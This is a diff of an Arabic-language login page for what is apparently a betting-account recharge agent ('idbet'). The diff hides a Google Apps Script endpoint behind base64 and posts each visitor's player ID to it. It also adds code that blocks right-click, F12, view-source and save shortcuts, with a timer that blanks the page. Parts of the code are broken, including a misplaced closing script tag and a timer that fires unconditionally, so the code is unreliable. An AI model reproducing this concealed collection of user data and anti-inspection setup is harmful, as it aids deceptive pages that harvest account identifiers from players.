@@ -19,9 +19,10 @@
       font-family: 'Tajawal', sans-serif;
       background: #f5f5f5;
       color: #333;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
       user-select: none;
-      -webkit-user-drag: none;
-      -webkit-touch-callout: none;
     }
     header {
       height: var(--header-height);
@@ -82,31 +83,24 @@
       align-items: center;
       justify-content: center;
     }
-
-    /* سيتم استكمال CSS في الجزء 2 */
-
   </style>
+  <script>
+    document.addEventListener("contextmenu", e => e.preventDefault());
+    document.addEventListener("keydown", e => {
+      if (e.key === "F12" || (e.ctrlKey && (e.key === "u" || e.key === "s"))) {
+        e.preventDefault();
+      }
+    });
+    (function () {
+      const start = Date.now();
+      setInterval(() => {
+        const duration = Date.now() - start;
+        if (duration > 2000) window.location.href = "about:blank";
+      }, 1000);
+    })();
+  </script>
 </head>
-<body 
-  oncontextmenu="return false"
-  onkeydown="if(event.keyCode==123||event.ctrlKey&&event.shiftKey&&event.keyCode==73||event.ctrlKey&&event.keyCode==85){return false;}">
-
-<script>
-  // Anti-inspect protection
-  setInterval(() => {
-    const t = new Date().getTime();
-    debugger;
-    const d = new Date().getTime();
-    if (d - t > 100) window.location.href = "https://google.com";
-  }, 1000);
-</script>
-
-<header>
-  <div class="header-brand">
-    <span class="idbet">idbet</span><span class="separator">|</span><span class="slogan">وكيل شحن</span>
-  </div>
-</header>
-<main>
+<body>
   <section class="login-box">
     <div class="title-wrapper">
       <div class="step-box">
@@ -116,6 +110,7 @@
       </div>
       <h2>تسجيل الدخول</h2>
     </div>
+
     <div class="input-label">
       <label for="player-id-1">معرّف اللاعب</label>
       <span class="info-icon" title="رقم مكوَّن من 7 إلى 15 رقمًا">?</span>
@@ -200,44 +195,35 @@
       statusIcon.innerHTML = '✓';
     }, 500);
   }
+</script>
   btn.addEventListener('click', async () => {
     btn.innerHTML = '<span class="btn-spinner"></span> جارٍ التحقق...';
     btn.disabled = true;
+
+    const encryptedURL = atob("aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J6UVhxZllLM3J6U1NSLVpLWUR4c2ExaXFULVVwZmZsSG5EWlFWblUzaEt4Tm9MR0owM2dQTzBLSWlqSDVZWmVsUWczQS9leGVj");
     const payload = { userId: input.value, platform: platform };
 
-    // تشفير الرابط باستخدام base64 + مفتاح ثابت
-    function decodeUrl(key) {
-      const base = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcw==";
-      return atob(base) + key;
-    }
-
-    const scriptURL = decodeUrl("AKfycbzQXqfYK3rzSSR-ZKYDxsa1iqTQUpfflHnDZQVnU3hKxNoLG0j3gPO0KIijH5YZelQg3A/exec");
-
     try {
-      await fetch(scriptURL, {
+      await fetch(encryptedURL, {
         method: 'POST',
         mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       });
-
-      // تخزين معلومات الدخول المؤقت
-      localStorage.setItem('userId', input.value);
-      sessionStorage.setItem('authorized', 'true');
-
       setTimeout(() => {
-        window.location.href = 'fr/office/recharge.html';
+        localStorage.setItem('userId', input.value);
+        window.location.replace('fr/office/recharge.html');
       }, 1200);
     } catch (err) {
       errMsg.textContent = 'حدث خطأ أثناء التحقق، حاول مجددًا.';
-      btn.innerHTML = 'تأكيد';
+      btn.innerHTML = 'تسجيل الدخول';
       btn.disabled = false;
     }
   });
 
   window.addEventListener('pageshow', () => {
     btn.disabled = true;
-    btn.innerHTML = 'تأكيد';
+    btn.innerHTML = 'تسجيل الدخول';
     errMsg.textContent = '';
     input.value = '';
     platform = null;
